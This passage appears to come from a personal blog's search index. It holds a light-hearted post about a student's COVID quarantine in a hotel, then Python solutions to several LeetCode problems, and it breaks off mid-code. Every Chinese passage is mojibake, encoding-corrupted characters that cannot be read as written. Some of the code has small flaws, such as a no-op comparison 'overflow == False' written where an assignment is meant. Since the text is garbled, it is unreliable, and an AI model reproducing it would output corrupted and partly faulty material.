ä¸ºéƒ¨é—¨é‚£è¾¹æœ‰ä¸ªåŒäº‹è·Ÿä¸€ä¸ªç¡®è¯Šçš„åé«˜é“åŒä¸€æ’ä¸Š ç„¶åä¸Šå‘¨å››éƒ¨é—¨åƒé¥­åšé¥¼ æˆ‘ä¹Ÿä¸çŸ¥é“é‚£ä¸ªåŒäº‹æ˜¯è°ï¼Œå½“æ—¶é¥­å±€çš„äºŒåå‡ æ¡Œ å¯èƒ½æˆ‘åœ¨è¿™å¤´ï¼Œä»–åœ¨é‚£å¤´ ç„¶åæˆ‘å°±è¢«ç®—æ˜¯æ¬¡å¯†æ¥äº† ä¸€æ¡Œçš„è¿˜åœ¨ä¸Šç­ï¼Œä¸ä¸€æ¡Œçš„å·²ç»å‡†å¤‡éš”ç¦»äº† èšŒåŸ ä½äº† è¾…å¯¼å‘˜åœ¨å“ªå‘¢ ç–«æƒ…çˆ†å‘çš„å½“æ™šå°±å›åŒå®‰çœ‹è€å©†å»äº† å…¶ä»–è€å¸ˆè¯´è®©ä»–ä½å¯å®¤ï¼Œä½†æ˜¯æ‹‰éƒ½æ‹‰ä¸ä½ å¯èƒ½æ˜¯å› ä¸ºåˆ°äº†ç¬¬äºŒå¤©å°æ ¡äº† ç„¶åå¯èƒ½ä»–é‚£å¤©å°±åœ¨å®¶é‡Œè·Ÿæˆ‘ä»¬å¼€å¹´çº§å¤§ä¼š å¼ºè°ƒæˆ‘ä»¬å­¦æ ¡ä¸æ˜¯å°æ ¡ï¼Œæ˜¯éå¿…è¦ä¸å¤–å‡º è¿™å·²ç»æ˜¯æˆ‘ç¬¬äºŒæ¬¡å¬äº† ç„¶åè¿‡ä¸¤å¤©åŒå®‰å°±å°äº† è¾…å¯¼å‘˜ä»ç„¶åšæŒå±…å®¶åŠå…¬ è¿™ç§ç²¾ç¥æˆ‘è§‰å¾—å€¼å¾—æˆ‘ä»¬å­¦ä¹  èšŒåŸ ä½äº† ç„¶åæˆ‘å°±å¼€å§‹æ”¶æ‹¾ä¸œè¥¿å‡†å¤‡éš”ç¦»äº† æ‹‰ç€è¡Œæç®±å»æ‰¾æ¥¼ç®¡åŠå¤–å‡ºæ‰‹ç»­ å¥¹é—®æˆ‘å¹²å˜› æˆ‘è¯´éš”ç¦» å¥¹æ‘†åœ¨æ¡Œä¸Šçš„åŒè‡‚ä¸‹æ„è¯†å¾—å¾€å›æ”¶äº†ä¸‹ å¡«å®Œæ‰‹ç»­å°±æç€è¡Œæå»éš”ç¦»äº† èšŒåŸ ä½äº† æˆ‘ä»¬å½“å¤©ä¸€å…±å»äº†äº”ä¸ªäººåƒé¥­ï¼Œæ‰€ä»¥äº”ä¸ªäººä¸€èµ·éš”ç¦» æˆ‘å¯¹è¾…å¯¼å‘˜å¾—çŸ¥å…¬å¸é‚£è¾¹çš„æ¶ˆæ¯å»¶è¿ŸæŒæœ‰æ€€ç–‘æ€åº¦ å¦‚æœçœŸæ˜¯å…¬å¸æœ‰è·Ÿå­¦æ ¡æ²Ÿé€šå°±ä¸ä¼šç–«æƒ…çˆ†å‘äº†ä¸‰å¤©å†å«æˆ‘ä»¬å»éš”ç¦» ç„¶åæˆ‘ä»¬å¼€å§‹æŸ¥å†…é¬¼ ç„¶åå°±å†…é¬¼è‡ªçˆ†äº† å› ä¸ºå¥¹çš„èˆå‹ä¸€ç›´å«å¥¹è·Ÿè¾…å¯¼å‘˜è‡ªçˆ† ç„¶åå¥¹ä»Šå¤©å°±å»è·Ÿè¾…å¯¼å‘˜è‡ªçˆ†äº† ç„¶åæˆ‘ä»¬éƒ½è¢«æ‹‰è¿‡æ¥éš”ç¦»äº† æˆ‘è§‰å¾—å¥¹èˆå‹å¦‚æ­¤ä¸ºç–«æƒ…é˜²æ§ç€æƒ³ï¼Œå¥¹åº”è¯¥ä¹Ÿè¿‡æ¥éš”ç¦»ï¼Œæ¯•ç«Ÿå¥¹ç®—æ˜¯å¯†æ¥çš„å¯†æ¥çš„å¯†æ¥äº† æˆ‘å¯»æ€æ ¸é…¸éƒ½æœ‰åšè¿‡äº†ï¼Œç»™æˆ‘æ•´å¾—æœ‰ç‚¹ä¸ä¼šäº† èšŒåŸ ä½äº† ç„¶åæˆ‘ä»¬äº”ä¸ªäººåœ¨é…’åº—é—¨å£ç«™äº†åå‡ åˆ†é’Ÿ æˆ‘ä»¬ä¸é…’åº—æœ‰ä¸€ä¸ªç»ç’ƒé—¨ç›¸éš”ï¼Œè¿™å¤´æ˜¯ä¸‰åå¤šåº¦çš„æ—¥å¤´ï¼Œé‚£å¤´æ˜¯äºŒåå…­åº¦çš„ç©ºè°ƒ ä½†æ˜¯ä¿å®‰ä¸è®©è¿›ï¼Œæ”¯æ”¯å¾å¾å¾—è¯´è¦æ‰¾å¯¹æ¥åŒ»ç”Ÿ é€æˆ‘ä»¬éš”ç¦»çš„è€å¸ˆå°±å»æ‰“ç”µè¯æ‰¾å¯¹æ¥åŒ»ç”Ÿ ç„¶åå¼€å§‹äº†ç»å…¸çš„è¸¢çš®çƒ è¸¢äº†ååˆ†é’Ÿå°±è¸¢å®Œäº† æˆ‘ä»¬ç™»è®°ä¹‹åé¢†äº†æˆ¿å¡å°±è¿›å»äº† ä¿å®‰ä¸è®©æˆ‘ä»¬ç”¨ç”µæ¢¯ ç„¶åæˆ‘ä»¬æ¬ç€è¡Œæèµ°æ¥¼æ¢¯ä¸Šäº†ä¸‰æ¥¼ è¿™å¯èƒ½æ˜¯æˆ‘ä¸€ç”Ÿä¸­å”¯ä¸€ä¸€æ¬¡èµ°æ¥¼æ¢¯å…¥ä½é…’åº—äº† èšŒåŸ ä½äº† åˆ°äº†æˆ¿é—´ä¹‹åæ’å¡å–ç”µ æˆ‘å‘ç°å–ç”µæ–¹å¼æ˜¯ä¼ ç»Ÿçš„æ’å¡å–ç”µ ç„¶åæˆ‘å°±æŠŠæˆ‘çš„å­¦ç”Ÿå¡æ’è¿›å»äº† æˆ¿é—´æ²¡æœ‰æ™¾è¡£æœçš„åœ°æ–¹ æˆ‘å°±æŠŠå¸¦çš„åƒåœ¾è¢‹ç³»æˆä¸€æ ¹ç»³å­ ä¸¤ç«¯ç»‘åœ¨é˜³å°æ‰¶æ‰‹è·Ÿæ°´ç®¡ ç„¶åæˆ‘å°±èƒ½æ™¾è¡£æœäº† æˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘è¦éš”ç¦»å¤šä¹… å¯èƒ½ä¸ƒå¤©ï¼Œå¯èƒ½åå››å¤©ï¼Œå¯èƒ½æ— æœŸ åæ­£å…è´¹çš„å•é—´è¿˜æ˜¯æŒºé¦™çš„ èšŒåŸ ä½äº† ç„¶åæˆ‘å°±å»ä¸Šå•æ‰€äº† å•æ‰€é‡Œæ‘†çš„æ˜¯é©¬æ¡¶ æŒ‰ç…§ä¹ æƒ¯ï¼Œå…ˆæ‹¿å«ç”Ÿçº¸æ“¦ä¸¤éï¼Œç„¶åæŠŠçº¸ä¸¢é©¬æ¡¶é‡Œé˜²æ­¢æº…æ°´èŠ± ç„¶åé©¬æ¡¶å°±å µä½äº† å¯èƒ½æ˜¯è¿™ä¸ªé©¬æ¡¶çš„å£å¾„ä¸å¤ªè¡Œ æŠŠæ°´åŠ åˆ°å…«æˆæ»¡è¿˜æ˜¯æ²¡ç”¨ ç„¶åæˆ‘å°±å»æ‰“ç”µè¯é—®å‰å°èƒ½ä¸èƒ½å¸®å¿™ç–é€šé©¬æ¡¶ å‰å°æ”¯æ”¯å¾å¾å¾—è¯´ç°åœ¨ç–«æƒ…çš„æƒ…å†µä¸æ˜¯å¾ˆæ–¹ä¾¿ ç„¶åæˆ‘é—®èƒ½ä¸èƒ½æŠŠé©¬æ¡¶æŠ½å­æ”¾åœ¨æˆ‘çš„é—¨å£ï¼Œæˆ‘è‡ªå·±æŠ½ä¸¤ä¸‹å­ ç„¶åå‰å°æ”¯æ”¯å¾å¾å¾—è¯´å»é—®ä¸€ä¸‹ æˆ‘å°±æŠŠä¹‹å‰æ´—çƒ­æ°´å£¶çƒ§çš„æ°´å€’è¿›é©¬æ¡¶ ç„¶åæ‘ä¸€ä¸‹å†²æ°´ï¼Œå°±é€šäº† ç„¶åé—¨é“ƒå“äº†ï¼Œä¸€ä¸ªé©¬æ¡¶æŠ½å­æ‘†åœ¨é—¨å£ è™½ç„¶æˆ‘ç°åœ¨ä¸éœ€è¦è¿™ä¸ªé©¬æ¡¶æŠ½å­ ä½†æ˜¯è¿™ä¸ªé©¬æ¡¶æŠ½å­èƒ½ç»™æˆ‘å¸¦æ¥æ— ç©·æ— å°½çš„å®‰å…¨æ„Ÿ èšŒåŸ ä½äº† ç„¶åæˆ‘å°±å»æ´—æ¾¡äº† æµ´å®¤çš„ç»ç’ƒé—¨æ˜¯é€æ˜çš„ï¼Œæˆ‘ä¸çŸ¥é“è¿™æ ·çš„ç”¨æ„æ˜¯ä»€ä¹ˆ ç„¶åç»ç’ƒé—¨çš„å¯¼è½¨æœ‰ç‚¹æ­ªï¼Œæ‹‰åŠ¨åä¼šå‘å·¦è¾¹æ»‘åŠ¨ æˆ‘è§‰å¾—å¯èƒ½æ˜¯æµ´å®¤çš„åœ°æ¿å¯èƒ½æ­ªå¾—æœ‰ç‚¹ç¦»è°±äº† èšŒåŸ ä½äº† ç„¶åæœ‰åŒ»åŠ¡äººå‘˜æ¥åšæ ¸é…¸æ£€æŸ¥ ç„¶åå«æˆ‘æ‰«ä¸€ä¸ªäºŒç»´ç é¢„çº¦ä¸€ä¸‹ æˆ‘è¿›å…¥é‚£ä¸ªå°ç¨‹åºçš„æ–¹å¼æœ‰ç‚¹ä¸å¯¹ è®©æˆ‘é€‰ä¸€ä¸ªé¢„çº¦æ—¶é—´ ç„¶åå°ç¨‹åºé‡Œé€‰ä¸äº†é¢„çº¦æ—¶é—´ ç„¶åå¿…é¡»è¦æœ‰é¢„çº¦æ—¶é—´æ‰èƒ½æäº¤è¿™ä¸ªé¢„çº¦ åŒ»åŠ¡äººå‘˜çœ‹ç€æˆ‘å¼„äº†ä¸‰å››éå°±è¯´è¦æˆ‘åŠ ä»–å¾®ä¿¡ å«æˆ‘è‡ªå·±æ…¢æ…¢ç© é¢„çº¦ä¸Šäº†æŠŠç»“æœå‘ç»™ä»– ä½†æ˜¯é‚£ä¸ªå°ç¨‹åºæˆ‘ç›´æ¥è¿›å»æ˜¯è¦ä»˜è´¹é¢„çº¦çš„ æ‰«ä»–ç»™çš„ç ä¸ç”¨ä»˜è´¹ æ‰€ä»¥æˆ‘å«ä»–æŠŠç å†å‘ä¸€ä¸‹ ç„¶åæˆ‘å°±é¢„çº¦ä¸Šäº† é€šè¿‡æ§åˆ¶å˜é‡æ³•ï¼Œæˆ‘è§‰å¾—å¯ä»¥è¯æ˜æ˜¯ä»–çš„é—®é¢˜ èšŒåŸ ä½äº† ç„¶åæˆ‘å°±å»è®¢é¤ç¾¤è®¢é¤äº† æœ‰å£æ°´é¸¡å¥—é¤ï¼Œçº¢çƒ§è‚‰å¥—é¤ï¼Œç¨€é¥­å¥—é¤ éƒ½æ˜¯å­¦æ ¡é£Ÿå ‚æ‰“åŒ…è¿‡æ¥çš„ ä»·æ ¼éƒ½æ˜¯12å— åº”è¯¥éƒ½æ˜¯ä¸€è¤äºŒç´  æˆ‘äº”ç‚¹åŠé¢„çº¦çš„é¥­ å¿«ä¸ƒç‚¹æ‰é€åˆ° æˆ‘å¯»æ€è¿™å±å®æœ‰ç‚¹ä¹…äº† ç„¶åå°±å¼€å§‹åƒé¥­äº† åƒå®Œé¥­æˆ‘å¯»æ€ä¸€ä¸‹å‘ç°åƒåœ¾è¢‹ä¸å¤Ÿç”¨ æˆ¿é—´é‡Œé™¤äº†å¥—åƒåœ¾æ¡¶ä¸Šçš„ä¹Ÿæœ‰æ²¡æœ‰å¤šä½™åƒåœ¾è¢‹ ä½†æ˜¯æ€»æ˜¯è¦ä¸¢åƒåœ¾çš„ æ‰€ä»¥æˆ‘æŠŠåƒåœ¾ä¸¢ç›’é¥­çš„è¢‹å­é‡Œ ç„¶åæŠŠè¢‹å­ä¸¢é—¨å£äº† èšŒåŸ ä½äº† ç„¶åæˆ‘å°±å¼€å§‹æ‰“dotaäº† æˆ‘åœ¨ä¸Šé«˜çš„æ—¶å€™è·Ÿæˆ‘ä¸€èµ·éš”ç¦»çš„å®¤å‹ç»™æˆ‘æ‰“ç”µè¯å«æˆ‘å¡«ä¸€ä¸ªéš”ç¦»å¤‡æ¡ˆè®°å½• æˆ‘è¯´å«ä»–ç­‰ä¸‹ æˆ‘åœ¨ç ´ç¬¬äºŒè·¯é«˜åœ°çš„æ—¶å€™ä»–åˆç»™æˆ‘æ‰“ç”µè¯äº† æˆ‘è¯´é©¬ä¸Šæ‰“å®Œ æ‰“å®Œä¹‹åæˆ‘å»å¡«é‚£ä¸ªéš”ç¦»å¤‡æ¡ˆè®°å½• ç„¶åæˆ‘ä¸çŸ¥é“è¯¥æ€ä¹ˆå¡« æˆ‘å¡«å¾—å·®ä¸å¤šäº†å»é—®ä»–æ˜¯ä¸æ˜¯è¿™æ ·å¡« ä»–è¯´ä»–å¸®æˆ‘å¡«å¥½äº† æˆ‘è¯´ è°¢è°¢ ç¥æ‚¨ç”Ÿæ´»æ„‰å¿« å†è§ èšŒåŸ ä½äº† ç„¶åæˆ‘åé¢åœ¨é€‰äººçš„æ—¶å€™åˆæœ‰åå¤§çš„è€å¸ˆæ¥æ‰“ç”µè¯ç»™æˆ‘è¯´ é—®æˆ‘æ˜¯å› ä¸ºä»€ä¹ˆè¢«éš”ç¦»çš„ æˆ‘è¯´æ¬¡å¯†æ¥ ä»–é—®æˆ‘æœ‰æ²¡æœ‰æ¥åˆ°é˜²ç–«ä¸­å¿ƒçš„ç”µè¯ æˆ‘è¯´æ²¡æœ‰ï¼Œæ˜¯è¾…å¯¼å‘˜å«æˆ‘éš”ç¦»çš„ ç„¶åé—®äº†æˆ‘ä¸€å †ä¸œè¥¿ æˆ‘ä¸æ˜¯å¾ˆæ¸…æ¥šä»–è¦é—®çš„ä¸œè¥¿ï¼Œè€Œä¸”æˆ‘ä¸æ˜¯å¾ˆæƒ³é€€æ‰è¿™æŠŠdota ç„¶åæˆ‘å°±æŠŠæˆ‘èˆå‹çš„åå­—æŠ¥ç»™ä»–äº†ï¼Œå«ä»–è”ç³»æˆ‘èˆå‹å»äº† ç„¶åæˆ‘å°±ç»§ç»­dotaäº† ç„¶åæˆ‘å°±æ„Ÿè§‰è¿™æ¬¡éš”ç¦»å¯èƒ½å°±æ˜¯å› ä¸ºæœ‰sbåœ¨çjbæï¼Œæ˜¯è°æˆ‘ä¸è¯´ ç„¶åå‡ ä¸ªä¸€èµ·éš”ç¦»çš„éƒ½è·Ÿæˆ‘è¯´å¯èƒ½æ˜å¤©å°±è¦è§£é™¤éš”ç¦»äº† å±äºæ˜¯ç™½å«–äº†ä¸€ä¸ªå•é—´çš„é’± èšŒåŸ ä½äº†","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"Unbengable","slug":"Unbengable","permalink":"https://yoloyolo.top/tags/Unbengable/"}]},{"title":"LeetCodeç—…å†è¡¨","slug":"LeetCode","date":"2021-09-11T06:44:51.000Z","updated":"2022-06-10T17:47:23.000Z","comments":true,"path":"2021/09/11/LeetCode/","link":"","permalink":"https://yoloyolo.top/2021/09/11/LeetCode/","excerpt":"åšè¯¾ç¨‹é¡¹ç›®çš„æ—¶å€™å‘ç°è‡ªå·±å¯¹ç®—æ³•ä¸€æ— æ‰€çŸ¥ åˆ·åˆ·é¢˜å§","text":"åšè¯¾ç¨‹é¡¹ç›®çš„æ—¶å€™å‘ç°è‡ªå·±å¯¹ç®—æ³•ä¸€æ— æ‰€çŸ¥ åˆ·åˆ·é¢˜å§ ä¸¤æ•°ä¹‹å’Œ ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„numså’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡ºå’Œä¸ºç›®æ ‡å€¼targetçš„é‚£ä¸¤ä¸ªæ•´æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚ ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œæ•°ç»„ä¸­åŒä¸€ä¸ªå…ƒç´ åœ¨ç­”æ¡ˆé‡Œä¸èƒ½é‡å¤å‡ºç°ã€‚ ä½ å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç­”æ¡ˆã€‚ ç¤ºä¾‹ 1ï¼š 123è¾“å…¥ï¼šnums &#x3D; [2,7,11,15], target &#x3D; 9è¾“å‡ºï¼š[0,1]è§£é‡Šï¼šå› ä¸º nums[0] + nums[1] &#x3D;&#x3D; 9 ï¼Œè¿”å› [0, 1] ã€‚ ç¤ºä¾‹ 2ï¼š 12è¾“å…¥ï¼šnums &#x3D; [3,2,4], target &#x3D; 6è¾“å‡ºï¼š[1,2] ç¤ºä¾‹ 3ï¼š 12è¾“å…¥ï¼šnums &#x3D; [3,3], target &#x3D; 6è¾“å‡ºï¼š[0,1] æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/two-sum è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ æš´åŠ›æœç´¢ï¼Œæ²¡å•¥å¥½è¯´çš„ 1234567class Solution: def twoSum(self, nums: List[int], target: int) -&gt; List[int]: length = len(nums) for index1 in range(length): for index2 in range(index1+1, length): if nums[index1] + nums[index2] == target: return([index1, index2]) åæ¥æƒ³äº†ä¸€ä¸‹ï¼Œå¯ä»¥ä»å¥‡å¶ç›¸åŠ è§„å¾‹çš„è§’åº¦è¿›è¡Œä¼˜åŒ– Odd+Odd=EvenOdd + Odd = EvenOdd+Odd=Even Odd+Even=OddOdd + Even = OddOdd+Even=Odd Even+Even=EvenEven + Even = EvenEven+Even=Even 1234567891011121314151617181920212223242526272829class Solution: def twoSum(self, nums: List[int], target: int) -&gt; List[int]: odd = [] even = [] for index1 in nums: # å¥‡å¶æ•°åˆ†ç±» if index1 % 2 == 0: even.append(index1) else: odd.append(index1) len_odd = len(odd) len_even = len(even) if target % 2 == 0: # å¶æ•° if len_odd &gt; 1: for index1 in range(len_odd): for index2 in range(index1+1, len_odd): if odd[index1] + odd[index2] == target: idx = nums.index(odd[index1]) return([idx, nums.index(odd[index2], idx+1)]) if len_even &gt; 1: for index1 in range(len_even): for index2 in range(index1+1, len_even): if even[index1] + even[index2] == target: idx = nums.index(even[index1]) return([idx, nums.index(even[index2], idx+1)]) else: # å¥‡æ•° for index1 in range(len_odd): for index2 in range(len_even): if odd[index1] + even[index2] == target: return([nums.index(odd[index1]), nums.index(even[index2])]) æ‰§è¡Œæ—¶é—´ç›´æ¥é™äº†ä¸€åŠ ä¸¤æ•°ç›¸åŠ  ç»™ä½ ä¸¤ä¸ªéç©ºçš„é“¾è¡¨ï¼Œè¡¨ç¤ºä¸¤ä¸ªéè´Ÿçš„æ•´æ•°ã€‚å®ƒä»¬æ¯ä½æ•°å­—éƒ½æ˜¯æŒ‰ç…§é€†åºçš„æ–¹å¼å­˜å‚¨çš„ï¼Œå¹¶ä¸”æ¯ä¸ªèŠ‚ç‚¹åªèƒ½å­˜å‚¨ä¸€ä½æ•°å­—ã€‚ è¯·ä½ å°†ä¸¤ä¸ªæ•°ç›¸åŠ ï¼Œå¹¶ä»¥ç›¸åŒå½¢å¼è¿”å›ä¸€ä¸ªè¡¨ç¤ºå’Œçš„é“¾è¡¨ã€‚ ä½ å¯ä»¥å‡è®¾é™¤äº†æ•°å­—0ä¹‹å¤–ï¼Œè¿™ä¸¤ä¸ªæ•°éƒ½ä¸ä¼šä»¥0å¼€å¤´ã€‚ ç¤ºä¾‹ 1ï¼š 123è¾“å…¥ï¼šl1 &#x3D; [2,4,3], l2 &#x3D; [5,6,4]è¾“å‡ºï¼š[7,0,8]è§£é‡Šï¼š342 + 465 &#x3D; 807. ç¤ºä¾‹ 2ï¼š 12è¾“å…¥ï¼šl1 &#x3D; [0], l2 &#x3D; [0]è¾“å‡ºï¼š[0] ç¤ºä¾‹ 3ï¼š 12è¾“å…¥ï¼šl1 &#x3D; [9,9,9,9,9,9,9], l2 &#x3D; [9,9,9,9]è¾“å‡ºï¼š[8,9,9,9,0,0,0,1] æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/add-two-numbers è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# Definition for singly-linked list.# class ListNode:# def __init__(self, val=0, next=None):# self.val = val# self.next = nextclass Solution: def addTwoNumbers(self, l1: ListNode, l2: ListNode) -&gt; ListNode: temp_node = ListNode() head = temp_node overflow = False while True: # ä¸¤ä¸ªé“¾è¡¨åŒæ­¥éƒ¨åˆ† temp_node.val = l1.val + l2.val if overflow == True: overflow = False temp_node.val += 1 if temp_node.val &gt;= 10: overflow = True temp_node.val %= 10 if l1.next != None and l2.next != None: temp_node.next = ListNode() l1 = l1.next l2 = l2.next temp_node = temp_node.next else: break if l1.next == None and l2.next == None: # ä¸¤ä¸ªé“¾è¡¨åŒæ—¶ç»“æŸ if overflow == True: temp_node.next = ListNode() temp_node = temp_node.next temp_node.val = 1 overflow == False return(head) else: # ä¸€ä¸ªé“¾è¡¨æå‰ç»“æŸ if l1.next != None: while True: l1 = l1.next temp_node.next = ListNode() temp_node = temp_node.next temp_node.val = l1.val if overflow == True: overflow = False temp_node.val += 1 if temp_node.val &gt;= 10: overflow = True temp_node.val %= 10 if l1.next == None: break elif l2.next != None: while True: l2 = l2.next temp_node.next = ListNode() temp_node = temp_node.next temp_node.val = l2.val if overflow == True: overflow = False temp_node.val += 1 if temp_node.val &gt;= 10: overflow = True temp_node.val %= 10 if l2.next == None: break if overflow == True: # é¢å¤–è¿›ä½ temp_node.next = ListNode() temp_node = temp_node.next temp_node.val = 1 overflow == False return(head) å‡ ä¸ªå‘æœ‰ç‚¹éº»çƒ¦ ä¸¤ä¸ªé“¾è¡¨é•¿åº¦ä¸åŒï¼Œè¿˜å¾—åˆ†l1ã€l2ä¸¤ç§æƒ…å†µ è¿›ä½ï¼ŒåŸºæœ¬æ¯ä¸€æ­¥è®¡ç®—éƒ½è¦æ£€æµ‹è¿›ä½ é¢å¤–è¿›ä½ï¼Œä¸¤ä¸ªäºŒä½æ•°åŠ å‡ºæ¥ä¸€ä¸ªä¸‰ä½æ•° æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸² ç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²sï¼Œè¯·ä½ æ‰¾å‡ºå…¶ä¸­ä¸å«æœ‰é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²çš„é•¿åº¦ã€‚ ç¤ºä¾‹ 1: 123è¾“å…¥: s &#x3D; &quot;abcabcbb&quot;è¾“å‡º: 3 è§£é‡Š: å› ä¸ºæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²æ˜¯ &quot;abc&quot;ï¼Œæ‰€ä»¥å…¶é•¿åº¦ä¸º 3ã€‚ ç¤ºä¾‹ 2: 123è¾“å…¥: s &#x3D; &quot;bbbbb&quot;è¾“å‡º: 1è§£é‡Š: å› ä¸ºæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²æ˜¯ &quot;b&quot;ï¼Œæ‰€ä»¥å…¶é•¿åº¦ä¸º 1ã€‚ ç¤ºä¾‹ 3: 1234è¾“å…¥: s &#x3D; &quot;pwwkew&quot;è¾“å‡º: 3è§£é‡Š: å› ä¸ºæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²æ˜¯&quot;wke&quot;ï¼Œæ‰€ä»¥å…¶é•¿åº¦ä¸º 3ã€‚ è¯·æ³¨æ„ï¼Œä½ çš„ç­”æ¡ˆå¿…é¡»æ˜¯ å­ä¸² çš„é•¿åº¦ï¼Œ&quot;pwke&quot;æ˜¯ä¸€ä¸ªå­åºåˆ—ï¼Œä¸æ˜¯å­ä¸²ã€‚ ç¤ºä¾‹ 4: 12è¾“å…¥: s &#x3D; &quot;&quot;è¾“å‡º: 0 æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/longest-substring-without-repeating-characters è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 123456789101112131415161718192021class Solution: def lengthOfLongestSubstring(self, s: str) -&gt; int: length = len(s) if length == 0: return(0) elif length == 1: return(1) else: sub_len = 0 for index1 in range(length): for index2 in range(index1+1, length): if s[index2] in s[index1:index2]: temp_len = index2 - index1 if temp_len &gt; sub_len: sub_len = temp_len break if index2 == length - 1: temp_len = index2 + 1 - index1 if temp_len &gt; sub_len: sub_len = temp_len return(sub_len) ä¾æ—§æš´åŠ›æœç´¢ï¼Œæœ‰å‡ ä¸ªå‘ ç©ºä¸² å•å­—ç¬¦ å­ä¸²ç»“å°¾ä¸æ¯ä¸²ç»“å°¾ç›¸åŒ å¯»æ‰¾ä¸¤ä¸ªæ­£åºæ•°ç»„çš„ä¸­ä½æ•° ç»™å®šä¸¤ä¸ªå¤§å°åˆ†åˆ«ä¸ºmå’Œnçš„æ­£åºï¼ˆä»å°åˆ°å¤§ï¼‰æ•°ç»„nums1å’Œnums2ã€‚è¯·ä½ æ‰¾å‡ºå¹¶è¿”å›è¿™ä¸¤ä¸ªæ­£åºæ•°ç»„çš„ä¸­ä½æ•°ã€‚ ç¤ºä¾‹ 1ï¼š 123è¾“å…¥ï¼šnums1 &#x3D; [1,3], nums2 &#x3D; [2]è¾“å‡ºï¼š2.00000è§£é‡Šï¼šåˆå¹¶æ•°ç»„ &#x3D; [1,2,3] ï¼Œä¸­ä½æ•° 2 ç¤ºä¾‹ 2ï¼š 123è¾“å…¥ï¼šnums1 &#x3D; [1,2], nums2 &#x3D; [3,4]è¾“å‡ºï¼š2.50000è§£é‡Šï¼šåˆå¹¶æ•°ç»„ &#x3D; [1,2,3,4] ï¼Œä¸­ä½æ•° (2 + 3) &#x2F; 2 &#x3D; 2.5 ç¤ºä¾‹ 3ï¼š 12è¾“å…¥ï¼šnums1 &#x3D; [0,0], nums2 &#x3D; [0,0]è¾“å‡ºï¼š0.00000 ç¤ºä¾‹ 4ï¼š 12è¾“å…¥ï¼šnums1 &#x3D; [], nums2 &#x3D; [1]è¾“å‡ºï¼š1.00000 ç¤ºä¾‹ 5ï¼š 12è¾“å…¥ï¼šnums1 &#x3D; [2], nums2 &#x3D; []è¾“å‡ºï¼š2.00000 æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/median-of-two-sorted-arrays è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 12345678910class Solution: def findMedianSortedArrays(self, nums1: List[int], nums2: List[int]) -&gt; float: new_list = nums1 + nums2 new_list.sort() length = len(new_list) if length % 2 == 1: mid_num = new_list[(length - 1)//2] else: mid_num = (new_list[(length)//2 - 1] + new_list[(length)//2]) / 2 return(mid_num) list().sort() yyds æœ€é•¿å›æ–‡å­ä¸² ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²sï¼Œæ‰¾åˆ°sä¸­æœ€é•¿çš„å›æ–‡å­ä¸²ã€‚ ç¤ºä¾‹ 1ï¼š 123è¾“å…¥ï¼šs &#x3D; &quot;babad&quot;è¾“å‡ºï¼š&quot;bab&quot;è§£é‡Šï¼š&quot;aba&quot; åŒæ ·æ˜¯ç¬¦åˆé¢˜æ„çš„ç­”æ¡ˆã€‚ ç¤ºä¾‹ 2ï¼š 12è¾“å…¥ï¼šs &#x3D; &quot;cbbd&quot;è¾“å‡ºï¼š&quot;bb&quot; ç¤ºä¾‹ 3ï¼š 12è¾“å…¥ï¼šs &#x3D; &quot;a&quot;è¾“å‡ºï¼š&quot;a&quot; ç¤ºä¾‹ 4ï¼š 12è¾“å…¥ï¼šs &#x3D; &quot;ac&quot;è¾“å‡ºï¼š&quot;a&quot; æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰ é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/longest-palindromic-substring è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ 1234567891011121314151617class Solution: def 